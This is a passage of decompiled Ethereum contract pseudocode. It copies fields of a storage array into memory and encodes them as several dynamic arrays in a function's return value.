        require idx < mem[(98 * stor8.length) + 192]
        mem[(32 * idx) + (98 * stor8.length) + 224] = stor8[idx].field_512
        require idx < mem[(131 * stor8.length) + 224]
        mem[(32 * idx) + (131 * stor8.length) + 256] = stor8[idx].field_768
        require idx < mem[(164 * stor8.length) + 256]
        mem[(32 * idx) + (164 * stor8.length) + 288] = stor8[idx].field_1024
        s = (6 * idx) + sha3(8)
        idx = idx + 1
        continue 
    mem[mem[64]] = 192
    mem[mem[64] + 192] = mem[96]
    _73 = mem[96]
    mem[mem[64] + 224 len floor32(mem[96])] = mem[128 len floor32(mem[96])]
    mem[mem[64] + 32] = (32 * mem[96]) + 224
    mem[(32 * mem[96]) + mem[64] + 224] = mem[(32 * stor8.length) + 128]
    _124 = mem[(32 * stor8.length) + 128]
    s = 0
    while 6 * stor8.length * stor8.length < 32 * mem[(32 * stor8.length) + 128]:
        mem[(32 * mem[96]) + mem[64] + (6 * stor8.length * stor8.length) + 256] = mem[(32 * stor8.length) + (6 * stor8.length * stor8.length) + 160]
        s = (6 * stor8.length * stor8.length) + 32
        continue 
    mem[mem[64] + 64] = (32 * mem[(32 * stor8.length) + 128]) + (32 * mem[96]) + 256
    mem[(32 * _124) + (32 * mem[96]) + mem[64] + 256] = mem[(64 * stor8.length) + 160]
    _158 = mem[(64 * stor8.length) + 160]
    mem[(32 * _124) + (32 * mem[96]) + mem[64] + 288 len floor32(mem[(64 * stor8.length) + 160])] = mem[(64 * stor8.length) + 192 len floor32(mem[(64 * stor8.length) + 160])]
    mem[mem[64] + 96] = (32 * _158) + (32 * _124) + (32 * mem[96]) + 288
    mem[(32 * _158) + (32 * _124) + (32 * mem[96]) + mem[64] + 288] = mem[(98 * stor8.length) + 192]
    _186 = mem[(98 * stor8.length) + 192]
    mem[(32 * _158) + (32 * _124) + (32 * mem[96]) + mem[64] + 320 len floor32(mem[(98 * stor8.length) + 192])] = mem[(98 * stor8.length) + 224 len floor32(mem[(98 * stor8.length) + 192])]
    mem[mem[64] + 128] = (32 * _186) + (32 * _158) + (32 * _124) + (32 * mem[96]) + 320
    mem[(32 * _186) + (32 * _158) + (32 * _124) + (32 * _73) + mem[64] + 320] = mem[(131 * stor8.length) + 224]
    _208 = mem[(131 * stor8.length) + 224]
    mem[(32 * _186) + (32 * _158) + (32 * _124) + (32 * _73) + mem[64] + 352 len floor32(mem[(131 * stor8.length) + 224])] = mem[(131 * stor8.length) + 256 len floor32(mem[(131 * stor8.length) + 224])]
    mem[mem[64] + 160] = (32 * _208) + (32 * _186) + (32 * _158) + (32 * _124) + (32 * _73) + 352
    mem[(32 * _208) + (32 * _186) + (32 * _158) + (32 * _124) + (32 * _73) + mem[64] + 352] = mem[(164 * stor8.length) + 256]
    _224 = mem[(164 * stor8.length) + 256]
    mem[(32 * _208) + (32 * _186) + (32 * _158) + (32 * _124) + (32 * _73) + mem[64] + 384 len floor32(mem[(164 * stor8.length) + 256])] = mem[(164 * stor8.length) + 288 len floor32(mem[(164 * stor8.length) + 256])]
    return 192, 
           mem[mem[64] + 32 len 128],
           (32 * _208) + (32 * _186) + (32 * _158) + (32 * _124) + (32 * _73) + 352,
           mem[mem[64] + 192 len (32 * _224) + (32 * _208) + (32 * _186) + (32 * _158) + (32 * _124) + (32 * _73) + 192]
}



}
